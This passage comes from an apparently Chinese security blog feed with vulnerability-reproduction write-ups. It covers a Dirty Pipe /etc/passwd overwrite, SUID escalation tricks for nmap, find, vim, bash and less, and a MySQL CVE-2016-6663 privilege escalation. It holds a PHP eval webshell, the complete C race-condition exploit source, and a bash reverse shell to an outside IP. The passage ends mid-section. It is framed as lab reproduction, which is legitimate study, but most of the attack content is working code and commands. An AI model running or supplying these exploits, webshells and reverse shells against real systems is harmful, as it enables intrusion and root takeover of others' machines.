src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092058888.png" alt="image-20220409205803130"></p><h3 id="2-通过覆写-etc-passwd文件进行提权poc验证"><a href="#2-通过覆写-etc-passwd文件进行提权poc验证" class="headerlink" title="2.) 通过覆写/etc/passwd文件进行提权poc验证"></a>2.) 通过覆写/etc/passwd文件进行提权poc验证</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先备份 /etc/passwd</span></span><br><span class="line">cp /etc/passwd /etc/passwd.upback</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092107334.png" alt="image-20220409210726975"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载EXP</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/0xIronGoat/dirty-pipe.git</span><br><span class="line"><span class="built_in">cd</span> dirty-pipe</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc exploit.c -o exploit</span><br></pre></td></tr></tbody></table></figure><p>这里了解一下/etc/passwd中各用户数据每个字段的含义. </p><p><strong>第一个字段:</strong> 是注册名, 也就是用户名称, 这里为root. </p><p><strong>第二个字段:</strong> 口令(passwd), 也就是密码, 这里的x代表的是密码标志, 而不是真正的密码, 真正的密码是保存在 /etc/shadow 文件中. </p><p>注: 在早期的 UNIX 中, 这里保存的就是真正的加密密码串. 现在的Unix/Linux系统中, 口令不再直接保存在passwd文件中, 通常将passwd文件中的口令字段使用一个“x”来代替, 将/etc /shadow作为真正的口令文件, 用于保存包括个人口令在内的数据. </p><p><strong>第三个字段:</strong> 是用户 ID(UID), 这里为0, 代表超级用户. </p><p>注: 0=超级用户、1~499=系统用户（伪用户）、500-65535=普通用户. </p><p><strong>第四个字段:</strong> 是用户的组 ID、这里为0, 代表所属组为0组. </p><p><strong>第五个字段:</strong>  是用户的简单说明, 这里为root, 没有什么特殊作用, 可以不写. </p><p><strong>第六个字段:</strong> 是这个用户的家目录, 这里为/root。</p><p>注：超级用户的家目录是 /root 目录, 普通用户在 /home/ 目录下建立和用户名相同的目录作为家目录, 如 as 用户的家目录就是 /home/as/ 目录. </p><p><strong>第七个字段:</strong> 是用户登录系统时运行的程序名称, 通常是一个Shell程序的全路径名, 可以理解为用户登录之后所拥有的权限, 这里为/bin/bash, 代表可以使用bash程序. </p><p>例: 若为/sbin/nologin代表禁止登录, 一般为系统用户. 若为/usr/bin/passwd, 这是修改用户密码程序的路径, 代表用户只能改自己的密码. </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 覆写提权</span></span><br><span class="line">./exploit /etc/passwd 5 <span class="string">":0:0:rootx:"</span></span><br><span class="line"><span class="comment"># 如果出现切换至root账户失败的情况, 可能是由于进行覆写提权时将密码置空了, 可以换下面的方法重新尝试</span></span><br><span class="line">./exploit /etc/passwd 5 <span class="string">":0:0:r1234:"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092126004.png" alt="image-20220409212630265"></p><ul><li><p>nmap</p><p> 较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092308313.png" alt="image-20220409230814819"></p><p> 该namp版本为4.53，在影响范围，交互模式可以用” <strong>interactive</strong> “参数</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092308670.png" alt="image-20220409230839048"></p><p> 出现交互式页面后，使用 !sh 可获得shell</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092309721.png" alt="image-20220409230859374"></p><p> 也可以通过Metasploit模块对Nmap的二进制文件进行权限提升</p> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></tbody></table></figure></li><li><p>find</p></li></ul><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></tbody></table></figure><ul><li>vim</li></ul><p>如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim/vi</span><br><span class="line">:shell</span><br></pre></td></tr></tbody></table></figure><ul><li>bash</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">&gt;<span class="comment"># id</span></span><br></pre></td></tr></tbody></table></figure><ul><li>less/more</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>建议将linux内核升级为安全版本, 目前在 Linux 5.10.102、5.15.25 和 5.16.11版本已修复. </li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权</title>
      <link href="/2022/04/10/%E5%A4%8D%E7%8E%B0MySQL%20CVE-2016-6663%20&amp;%20CVE-2016-6664%20%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83/"/>
      <url>/2022/04/10/%E5%A4%8D%E7%8E%B0MySQL%20CVE-2016-6663%20&amp;%20CVE-2016-6664%20%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h2 id="复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权"><a href="#复现MySQL-CVE-2016-6663-amp-CVE-2016-6664-组合提权" class="headerlink" title="复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权"></a>复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>​    1.) GetShell 拿到 www-data 权限<br>​    2.) 拿到 CREATE / INSERT / SELECT 低权限的 MySQL 帐户<br>​    3.) 关键提取步骤需要在交互环境瞎, 所以需要反弹 Shell<br>​    4.) MySQL 版本需要 &lt;= 5.5.51 或 5.6.x &lt;= 5.6.32 或 5.7.瞎&lt;= 5.7.14 或 8.x &lt; 8.0.1</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉取镜像</span></span><br><span class="line">docker pull tutum/lamp</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">docker run -d -P tutum/lamp</span><br><span class="line"><span class="comment"># 查看并进入容器</span></span><br><span class="line">docker ps<span class="comment"># 2a69ebc3709c</span></span><br><span class="line">docker <span class="built_in">exec</span> -it &lt;container_id&gt; /bin/bash<span class="comment"># 2a69ebc3709c</span></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">apt update &amp;&amp; apt install -y wget gcc libmysqlclient-dev</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091506478.png" alt="image-20220409150613850"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091508382.png" alt="image-20220409150709619"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091509332.png" alt="image-20220409150915378"></p><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 添加用户test,密码123456,授予权限create,drop,insert,select</span><br><span class="line">mysql</span><br><span class="line">create database testdb;</span><br><span class="line">CREATE USER 'test'@'%' IDENTIFIED BY '1234'; </span><br><span class="line">grant create,drop,insert,select on testdb.* to 'test'@'%';</span><br><span class="line">flush privileges;  //MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091525490.png" alt="image-20220409152459195"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 写入webshell</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;?php @eval(\$_POST[1]);?&gt;"</span> &gt;  /<span class="keyword">var</span>/www/html/shell.php</span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod -R <span class="number">777</span> /<span class="keyword">var</span>/www/html</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091518574.png" alt="image-20220409151848067"></p><p><u>首先蚁剑连webshell</u>: <a href="http://172.17.0.2/">http://172.17.0.2/</a></p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091531238.png" alt="image-20220409153143827"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091532479.png" alt="image-20220409153256064"></p><p>用户是: www-data, 是一个低权限用户</p><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091535434.png" alt="image-20220409153520898"></p><p>上传需要用到的 mysql-privesc-race.c 文件</p><p>CVE-2016-6663 EXP mysql-privesc-race.c 参考链接：<a href="https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html">MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit</a></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;grp.h&gt;</span><br><span class="line">#include &lt;mysql.h&gt;</span><br><span class="line">#include &lt;pwd.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/inotify.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#define EXP_PATH          "/tmp/mysql_privesc_exploit"</span><br><span class="line">#define EXP_DIRN          "mysql_privesc_exploit"</span><br><span class="line">#define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"</span><br><span class="line">#define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"</span><br><span class="line"></span><br><span class="line">#define SUID_SHELL     EXP_PATH "/mysql_suid_shell.MYD"</span><br><span class="line"></span><br><span class="line">#define MAX_DELAY 1000    // can be used in the race to adjust the timing if necessary</span><br><span class="line"></span><br><span class="line">MYSQL *conn;  // DB handles</span><br><span class="line">MYSQL_RES *res;</span><br><span class="line">MYSQL_ROW row;</span><br><span class="line"></span><br><span class="line">unsigned long cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void intro() {</span><br><span class="line"></span><br><span class="line">printf( </span><br><span class="line">        "\033[94m\n"</span><br><span class="line">        "MySQL/Percona/MariaDB - Privilege Escalation / Race Condition PoC Exploit\n"</span><br><span class="line">        "mysql-privesc-race.c (ver. 1.0)\n\n"</span><br><span class="line">        "CVE-2016-6663 / CVE-2016-5616\n\n"</span><br><span class="line">        "For testing purposes only. Do no harm.\n\n"</span><br><span class="line">"Discovered/Coded by:\n\n"</span><br><span class="line">"Dawid Golunski \n"</span><br><span class="line">"http://legalhackers.com"</span><br><span class="line">        "\033[0m\n\n");</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void usage(char *argv0) {</span><br><span class="line">    intro();</span><br><span class="line">    printf("Usage:\n\n%s user pass db_host database\n\n", argv0);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">void mysql_cmd(char *sql_cmd, int silent) {</span><br><span class="line">    </span><br><span class="line">    if (!silent) {</span><br><span class="line">    printf("%s \n", sql_cmd);</span><br><span class="line">    }</span><br><span class="line">    if (mysql_query(conn, sql_cmd)) {</span><br><span class="line">        fprintf(stderr, "%s\n", mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    }</span><br><span class="line">    res = mysql_store_result(conn);</span><br><span class="line">    if (res&gt;0) mysql_free_result(res);</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc,char **argv)</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">    int randomnum = 0;</span><br><span class="line">    int io_notified = 0;</span><br><span class="line">    int myd_handle;</span><br><span class="line">    int wpid;</span><br><span class="line">    int is_shell_suid=0;</span><br><span class="line">    pid_t pid;</span><br><span class="line">    int status;</span><br><span class="line">    struct stat st;</span><br><span class="line">    /* io notify */</span><br><span class="line">    int fd;</span><br><span class="line">    int ret;</span><br><span class="line">    char buf[4096] __attribute__((aligned(8)));</span><br><span class="line">    int num_read;</span><br><span class="line">    struct inotify_event *event;</span><br><span class="line">    /* credentials */</span><br><span class="line">    char *user     = argv[1];</span><br><span class="line">    char *password = argv[2];</span><br><span class="line">    char *db_host  = argv[3];</span><br><span class="line">    char *database = argv[4];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Disable buffering of stdout</span><br><span class="line">    setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">    // Get the params</span><br><span class="line">    if (argc!=5) {</span><br><span class="line">usage(argv[0]);</span><br><span class="line">exit(1);</span><br><span class="line">    } </span><br><span class="line">    intro();</span><br><span class="line">    // Show initial privileges</span><br><span class="line">    printf("\n[+] Starting the exploit as: \n");</span><br><span class="line">    system("id");</span><br><span class="line"></span><br><span class="line">    // Connect to the database server with provided credentials</span><br><span class="line">    printf("\n[+] Connecting to the database `%s` as %s@%s\n", database, user, db_host);</span><br><span class="line">    conn = mysql_init(NULL);</span><br><span class="line">    if (!mysql_real_connect(conn, db_host, user, password, database, 0, NULL, 0)) {</span><br><span class="line">        fprintf(stderr, "%s\n", mysql_error(conn));</span><br><span class="line">        exit(1);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    // Prepare tmp dir</span><br><span class="line">    printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN);</span><br><span class="line">    umask(000);</span><br><span class="line">    system("rm -rf /tmp/" EXP_DIRN " &amp;&amp; mkdir /tmp/" EXP_DIRN);</span><br><span class="line">    system("chmod g+s /tmp/" EXP_DIRN );</span><br><span class="line"></span><br><span class="line">    // Prepare exploit tables :)</span><br><span class="line">    printf("\n[+] Creating mysql tables \n\n");</span><br><span class="line">    mysql_cmd("DROP TABLE IF EXISTS exploit_table", 0);</span><br><span class="line">    mysql_cmd("DROP TABLE IF EXISTS mysql_suid_shell", 0);</span><br><span class="line">    mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);</span><br><span class="line">    mysql_cmd("CREATE TABLE mysql_suid_shell (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 0);</span><br><span class="line"></span><br><span class="line">    // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file</span><br><span class="line">    // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory</span><br><span class="line">    printf("\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n");</span><br><span class="line">    system("cp /bin/bash " SUID_SHELL);</span><br><span class="line">    system("ls -l " SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    // Use inotify to get the timing right</span><br><span class="line">    fd = inotify_init();</span><br><span class="line">    if (fd &lt; 0) {</span><br><span class="line">        printf("failed to inotify_init\n");</span><br><span class="line">        return -1;</span><br><span class="line">    }</span><br><span class="line">    ret = inotify_add_watch(fd, EXP_PATH, IN_CREATE | IN_CLOSE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /* Race loop until the mysql_suid_shell.MYD table file gets assigned SUID+exec perms */</span><br><span class="line"></span><br><span class="line">    printf("\n[+] Entering the race loop... Hang in there...\n");</span><br><span class="line"></span><br><span class="line">    while ( is_shell_suid != 1 ) {</span><br><span class="line"></span><br><span class="line">        cnt++;</span><br><span class="line">if ( (cnt % 100) == 0 ) {</span><br><span class="line"> printf("-&gt;");</span><br><span class="line"> //fflush(stdout);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        /* Create empty file , remove if already exists */</span><br><span class="line">        unlink(MYSQL_TEMP_FILE);</span><br><span class="line">        unlink(MYSQL_TAB_FILE);</span><br><span class="line">   mysql_cmd("DROP TABLE IF EXISTS exploit_table", 1);</span><br><span class="line">mysql_cmd("CREATE TABLE exploit_table (txt varchar(50)) engine = 'MyISAM' data directory '" EXP_PATH "'", 1);</span><br><span class="line"></span><br><span class="line">/* random num if needed */</span><br><span class="line">        srand ( time(NULL) );</span><br><span class="line">        randomnum = ( rand() % MAX_DELAY );</span><br><span class="line"></span><br><span class="line">        // Fork, to run the query asynchronously and have time to replace table file (MYD) with a symlink</span><br><span class="line">        pid = fork();</span><br><span class="line">        if (pid &lt; 0) {</span><br><span class="line">            fprintf(stderr, "Fork failed :(\n");</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /* Child process - executes REPAIR TABLE  SQL statement */</span><br><span class="line">        if (pid == 0) {</span><br><span class="line">            usleep(500);</span><br><span class="line">            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">    mysql_cmd("REPAIR TABLE exploit_table EXTENDED", 1);</span><br><span class="line">            // child stops here</span><br><span class="line">            exit(0);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /* Parent process - aims to replace the temp .tmd table with a symlink before chmod */</span><br><span class="line">        if (pid &gt; 0 ) {</span><br><span class="line">            io_notified = 0;</span><br><span class="line"></span><br><span class="line">            while (1) {</span><br><span class="line">                int processed = 0;</span><br><span class="line">                ret = read(fd, buf, sizeof(buf));</span><br><span class="line">                if (ret &lt; 0) {</span><br><span class="line">                    break;</span><br><span class="line">                }</span><br><span class="line">                while (processed &lt; ret) {</span><br><span class="line">                    event = (struct inotify_event *)(buf + processed);</span><br><span class="line">                    if (event-&gt;mask &amp; IN_CLOSE) {</span><br><span class="line">                        if (!strcmp(event-&gt;name, "exploit_table.TMD")) {</span><br><span class="line">                            //usleep(randomnum);</span><br><span class="line"></span><br><span class="line">    // Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span><br><span class="line">    unlink(MYSQL_TAB_FILE);</span><br><span class="line">    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, 0777);</span><br><span class="line">    close(myd_handle);</span><br><span class="line">    chmod(MYSQL_TAB_FILE, 04777);</span><br><span class="line"></span><br><span class="line">    // Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=1;</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                    processed += sizeof(struct inotify_event);</span><br><span class="line">                }</span><br><span class="line">                if (io_notified) {</span><br><span class="line">                    break;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, 0);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">// Check if SUID bit was set at the end of this attempt</span><br><span class="line">        if ( lstat(SUID_SHELL, &amp;st) == 0 ) {</span><br><span class="line">    if (st.st_mode &amp; S_ISUID) {</span><br><span class="line">is_shell_suid = 1;</span><br><span class="line">    }</span><br><span class="line">        } </span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    printf("\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n", cnt);</span><br><span class="line">    system("ls -l " SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    printf("\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n");</span><br><span class="line">    system(SUID_SHELL " -p -i ");</span><br><span class="line">    //system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span><br><span class="line"></span><br><span class="line">    /* close MySQL connection and exit */</span><br><span class="line">    printf("\n[+] Job done. Exiting\n\n");</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091542561.png" alt="image-20220409154215199"></p><p>蚁剑终端反弹 Shell</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.232.129/4444 0&gt;&amp;1</span><br><span class="line"><span class="comment"># 有可能会报错: Syntax error: Bad fd number</span></span><br><span class="line"><span class="comment"># 解决方法</span></span><br><span class="line">rm -f /bin/sh</span><br><span class="line">ln -sf /bin/bash /bin/sh</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091609390.png" alt="image-20220409160935454"></p><h3 id="提示为-MySQL-权限"><a href="#提示为-MySQL-权限" class="headerlink" title="提示为 MySQL 权限"></a>提示为 MySQL 权限</h3><p><strong>利用CVE-2016-6663</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入刚刚上传的POC的目录下</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I /usr/include/mysql -l mysqlclient</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 1234 localhost testdb</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091622915.png" alt="image-20220409162230577"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091623093.png" alt="image-20220409162306004"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091624431.png" alt="image-20220409162457137"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204091626922.png" alt="image-20220409162629415"></p><h3 id="Mysql权限提升为root权限"><a href="#Mysql权限提升为root权限" 